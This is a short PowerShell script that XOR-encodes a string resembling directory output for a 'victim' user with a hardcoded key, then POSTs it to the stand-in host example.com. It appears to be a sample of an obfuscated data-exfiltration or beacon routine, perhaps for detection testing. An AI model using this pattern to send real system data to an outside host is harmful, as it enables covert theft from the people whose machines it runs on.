﻿$plaintext = ([system.Text.Encoding]::UTF8.getBytes("Path\n----\nC:\Users\victim"))
$key = "abcdefghijklmnopqrstuvwxyz123456"
$cyphertext =  @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
[System.Net.ServicePointManager]::Expect100Continue = $false
Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive